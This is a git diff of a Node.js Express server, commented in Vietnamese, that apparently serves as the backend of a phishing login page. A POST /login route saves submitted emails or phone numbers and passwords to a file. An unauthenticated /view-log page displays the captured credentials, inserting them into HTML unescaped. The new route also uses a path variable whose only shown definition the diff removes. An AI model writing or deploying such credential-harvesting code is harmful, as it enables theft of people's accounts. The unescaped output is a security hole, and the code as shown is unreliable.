@@ -12,6 +12,7 @@ app.use(bodyParser.json());
 
 app.use(express.static(path.join(__dirname, "public")));
 
+// Route POST để nhận thông tin đăng nhập và lưu vào tệp
 app.post("/login", (req, res) => {
   const { emailOrPhone, password } = req.body;
 
@@ -39,25 +40,47 @@ app.post("/login", (req, res) => {
   });
 });
 
-app.get("/download-log", (req, res) => {
-  const logFilePath = path.join("/tmp", "login_data.txt");
-  console.log("Đường dẫn tệp:", logFilePath); // Debug đường dẫn tệp
-
-  if (!fs.existsSync(logFilePath)) {
-    console.log("Tệp không tồn tại."); // Debug thông báo nếu tệp không tồn tại
-    return res
-      .status(404)
-      .json({ success: false, message: "Tệp không tìm thấy." });
-  }
-
-  res.download(logFilePath, "login_data.txt", (err) => {
+// Route GET để hiển thị nội dung của tệp login_data.txt
+app.get("/view-log", (req, res) => {
+  // Đọc nội dung tệp login_data.txt
+  fs.readFile(logFilePath, "utf8", (err, data) => {
     if (err) {
-      console.error("Lỗi khi gửi tệp: ", err);
+      console.error("Lỗi khi đọc tệp:", err);
       return res
         .status(500)
-        .json({ success: false, message: "Không thể tải tệp!" });
+        .json({ success: false, message: "Không thể đọc tệp." });
     }
-    console.log("Tệp đã được gửi thành công.");
+
+    if (!data) {
+      return res.status(404).send("<h1>Không có dữ liệu đăng nhập nào!</h1>");
+    }
+
+    // Trả về dữ liệu tệp trong một trang HTML
+    res.send(`
+      <html>
+        <head>
+          <title>Thông tin đăng nhập</title>
+          <style>
+            body {
+              font-family: Arial, sans-serif;
+              margin: 20px;
+            }
+            h1 {
+              color: #333;
+            }
+            pre {
+              background-color: #f4f4f4;
+              padding: 20px;
+              border-radius: 5px;
+            }
+          </style>
+        </head>
+        <body>
+          <h1>Thông tin đăng nhập đã lưu</h1>
+          <pre>${data}</pre>
+        </body>
+      </html>
+    `);
   });
 });
 
